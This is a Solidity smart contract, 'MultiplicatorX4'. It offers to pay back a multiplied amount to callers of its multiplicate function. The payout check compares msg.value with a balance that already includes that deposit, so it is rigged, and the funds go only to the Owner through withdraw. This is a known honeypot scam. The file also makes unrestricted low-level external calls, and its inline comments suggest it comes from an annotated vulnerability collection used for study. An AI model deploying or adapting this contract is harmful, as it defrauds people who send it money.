pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == Owner);
        require(_adr.call.value(msg.value)(_data)); // Check return value of external call
    }

    function multiplicate(address _adr) public payable {
        if (msg.value >= this.balance) {
            require(_adr.call.value(this.balance + msg.value)()); // Check return value of external call
        }
    }
}